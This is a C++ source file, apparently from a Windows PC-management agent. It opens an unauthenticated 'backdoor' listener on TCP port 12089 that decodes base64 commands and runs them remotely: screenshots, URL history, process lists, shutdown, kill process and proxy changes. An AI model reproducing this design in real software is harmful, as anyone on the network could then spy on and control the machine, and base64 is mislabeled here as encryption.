///////////////////////////////////////////////////////////////////////////////////////////////////
// Copyright 2005-2010 Plustar Corporation. All rights reserved. プラスター
// Powered by jobscale
// Since 22 July 1973
// Area in osaka, Japan
//

#define _WIN32_WINNT 0x0502
#define WINVER 0x0502

#ifdef _AFXDLL
#include <afxwin.h>
#else
#include <atlcomtime.h>
#endif

#include "../oCommon/oTools.h"
#include "../oCommon/oSocketTools.h"
#include "../oCommon/oBase64.h"

#define _OFC_EXPORT_
#include "../ofc/oCriticalTrace.h"

#include "pProcess.h"
#include "pNetwork.h"
#include "pConsole.h"

#include "pFunction.h"
#include "pUtility.h"

///////////////////////////////////////////////////////////////////////////////////////////////////
// 

/*
	shutdown
	　Windowsのシャットダウン

	reboot
	　Windowsの再起動

	restorepoint
	　復元ポイントの追加

	screenshot
	　スクリーンイメージの取得

	processlist
	　プロセスリストの取得

	uninstall
	　アンインストール情報の取得

	urlhistory
	　URL履歴の取得

	machineinfo
	　マシン構成情報の取得

	killprocess winny.exe
	　指定したプロセスの停止

	deskwallpaper http://exsample.jp
	　壁紙の変更

	setproxy proxy.exsample.jp:8080
	　proxyの設定
*/

#define COMMANDTHREADFUNCTION(name)								\
	COMTHREADPROC(name)											\
	{															\
		CWSAInterface wsa;										\
		LPTRANSACTIONDATA pData = (LPTRANSACTIONDATA)pParam;	\
		RUNFUNC(name)(pData);									\
		if (!pData->isSync)										\
		{														\
			delete pData;										\
		}														\
		return 0;												\
	}

COMMANDTHREADFUNCTION(Shutdown)
COMMANDTHREADFUNCTION(Reboot)
COMMANDTHREADFUNCTION(ForegroundList)
COMMANDTHREADFUNCTION(ProcessList)
COMMANDTHREADFUNCTION(ConnectionList)
COMMANDTHREADFUNCTION(UrlHistory)
COMMANDTHREADFUNCTION(Uninstall)
COMMANDTHREADFUNCTION(ScreenShot)
COMMANDTHREADFUNCTION(KillProcess)
COMMANDTHREADFUNCTION(DeskWallPaper)
COMMANDTHREADFUNCTION(SetProxy)
COMMANDTHREADFUNCTION(MachineInfo)
COMMANDTHREADFUNCTION(SendHardwareData)
COMMANDTHREADFUNCTION(SendAnalyze)

struct CMDDATA
{
	CoString cmd;
	LPTHREAD_START_ROUTINE func;
	BOOL isSync;
	CMDDATA(LPCTSTR _cmd = 0, LPTHREAD_START_ROUTINE _func = 0, BOOL _isSync = TRUE)
		: cmd(_cmd)
		, func(_func)
		, isSync(_isSync)
	{
	}
};

// バックドアコマンドの一覧
static const CMDDATA g_cmd_data[] ={
	CMDDATA(P("deskwallpaper "), COMTHREAD(DeskWallPaper), TRUE),
	CMDDATA(P("killprocess "), COMTHREAD(KillProcess), TRUE),
	CMDDATA(P("setproxy "), COMTHREAD(SetProxy), TRUE),
	CMDDATA(P("shutdown"), COMTHREAD(Shutdown), TRUE),
	CMDDATA(P("reboot"), COMTHREAD(Reboot), TRUE),
	CMDDATA(P("screenshot"), COMTHREAD(ScreenShot), TRUE),
	CMDDATA(P("foregroundlist"), COMTHREAD(ForegroundList), TRUE),
	CMDDATA(P("processlist"), COMTHREAD(ProcessList), TRUE),
	CMDDATA(P("connectionlist"), COMTHREAD(ConnectionList), TRUE),
	CMDDATA(P("uninstall"), COMTHREAD(Uninstall), TRUE),
	CMDDATA(P("urlhistory"), COMTHREAD(UrlHistory), TRUE),
	CMDDATA(P("machineinfo"), COMTHREAD(MachineInfo), TRUE),
	CMDDATA(P("sendanalyze"), COMTHREAD(SendAnalyze), TRUE),
};

DWORD WINAPI TransmissionThread(LPVOID pParam)
{
	CRITICALTRACE(receive, TransmissionThread);

	CWSAInterface wsa;

	SOCKET sock = (*(OSOCKET_DATA*)pParam).socket;

	CoAutoSocket autoSocket(sock);

	CoString msgstr, text, result;

	HANDLE hThread = NULL;

	// read
	CoString recvBuf;
	LRESULT resRecv = TransRecvTCP(sock, recvBuf);
	if (resRecv != 0)
	{
		// 通信障害
		DEBUG_OUT_DEFAULT("failed.");
		return -1;
	}

	if (resRecv == 0 && recvBuf.GetLength())
	{
		// 暗号の解除
		CoString recvData;
		base64_decode(recvBuf, recvData);

		msgstr.Format("\0 Received %d bytes.\r\n" + 2, recvData.GetLength());
		text += msgstr;

		msgstr.Format("\0 ERROR: without command [%s].\r\n" + 2, (LPCTSTR)recvData);

		for (INT i = 0, count = sizeof g_cmd_data / sizeof CMDDATA; i < count; i++)
		{
			if (g_cmd_data[i].cmd.Compare(recvData.Left(g_cmd_data[i].cmd.GetLength())) == 0)
			{
				LPTRANSACTIONDATA pData = new TRANSACTIONDATA(g_cmd_data[i].isSync);
				pData->text = recvData.Right(recvData.GetLength() - g_cmd_data[i].cmd.GetLength());
				msgstr.Format("\0 %s [%s].\n" + 2, (LPCTSTR)g_cmd_data[i].cmd, (LPCTSTR)pData->text);
				if (pData->isSync)
				{
					g_cmd_data[i].func(pData);
					result = pData->result;
					delete pData;
				}
				else
				{
					hThread = CreateThread(NULL, 0, g_cmd_data[i].func, pData, 0, NULL);
				}
				break;
			}
		}

		text += msgstr;

		if (hThread)
		{
			CloseHandle(hThread);
			hThread = NULL;
		}
	}
	else
	{
		text += ("\0 Transmission empty over.\r\n" + 2);
	}

	if (!result.IsEmpty())
	{
		text = result;
	}

	int n = send(sock, text, text.GetLength(), 0);
	if (n < 1)
	{
		DEBUG_OUT_DEFAULT("trans send failed.");
		return -1;
	}

	return 0;
}

INT AcceptSocketSpecial()
{
	SOCKET  sock0 = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock0 == INVALID_SOCKET)
	{
		DEBUG_OUT_DEFAULT("failed.");
		return -1;
	}

	WORD portNo = 12089; // バックドアポート
	sockaddr_in addr = { 0 };
	sockaddr_in client = { 0 };
	addr.sin_family = AF_INET;
	addr.sin_port = htons(portNo);
	addr.sin_addr.s_addr = INADDR_ANY;

	if (bind(sock0, (sockaddr*)&addr, sizeof addr) != 0)
	{
		DEBUG_OUT_DEFAULT("bind failed.");
		return -1;
	}

	if (listen(sock0, 5) != 0)
	{
		DEBUG_OUT_DEFAULT("failed.");
		return -1;
	}

	for (; ; )
	{
		int len = sizeof client;
		SOCKET sock = accept(sock0, (sockaddr*)&client, &len);
		if (sock == INVALID_SOCKET)
		{
			DEBUG_OUT_DEFAULT("failed.");
			break;
		}

		OSOCKET_DATA* socketData = new OSOCKET_DATA(TransmissionThread, sock, client);
		DWORD WINAPI MultiSocketThread(LPVOID pParam);
		HANDLE hThread = CreateThread(NULL, 0, MultiSocketThread, socketData, 0, NULL);
		WaitForMultipleObjects(1, &hThread, TRUE, INFINITE);
		CloseHandle(hThread);
	}

	return 0;
}
